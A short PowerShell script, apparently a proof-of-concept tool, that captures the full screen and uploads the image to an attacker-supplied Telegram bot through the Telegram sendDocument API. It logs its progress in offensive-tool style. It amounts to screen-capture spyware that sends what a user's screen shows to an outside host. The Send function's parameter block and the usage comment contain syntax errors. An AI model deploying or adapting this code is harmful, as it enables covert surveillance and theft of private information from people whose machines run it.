function Log-Message
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$LogMessage
    )

    Write-Output ("{0} - {1}" -f (Get-Date), $LogMessage)
}


function Take-Screenshot {
	
  
	param(
	[Parameter(Mandatory=$True)]
	[string]$Path
	)
	
	BEGIN {

	}
	
	PROCESS {
		[Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null
		[Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null
		
		if(-Not [Environment]::UserInteractive) {
			Write-Host "[-] WARNING process is not interactive your screen capture will likely fail"
		}

		$bounds = [System.Windows.Forms.Screen]::AllScreens.Bounds
		Write-Host "[+] Screen resolution is $($bounds.Width) x $($bounds.Height)"
		$bounds = [Drawing.Rectangle]::FromLTRB(0, 0,  $bounds.Width, $bounds.Height)
		$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
		$graphics = [Drawing.Graphics]::FromImage($bmp)
		$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
		$bmp.Save($Path)
		$graphics.Dispose()
		$bmp.Dispose()
	}
	
	END {
		Write-Host "[+] Screenshot saved $($Path)"
		Write-Host "[+] Process completed..."
	}
}


function Send{
    param(
    [Parameter(Mandatory=$true,Position=0)] [String[]]$PicPath
    [Parameter(Mandatory=$true,Position=1)] [String[]]$BId
    [Parameter(Mandatory=$true,Position=2)] [String[]]$BToken
    )
    Write-Output "Pic : $PicPath BotId: $BId BotToken: $BToken"

    $path = $PicPath

    Take-Screenshot $path


    $doc = $path

    $BotToken = $BToken
    $chatID = $BId


    $Uri = "https://api.telegram.org/bot$($BotToken)/sendDocument"
    #Build the Form
    $Form = @{
      chat_id = $chatID
      document = Get-Item $doc
    }
    Invoke-RestMethod -Uri $uri -Form $Form -Method Post
    Log-Message " ------------------- FORWARD SCREEN "
  }
# SCREEN2TELEGTAM -PicPath "path/poc.png" -Bid "TELEGRAM" ID" $BToken "TELEGRAM TOKEN"  
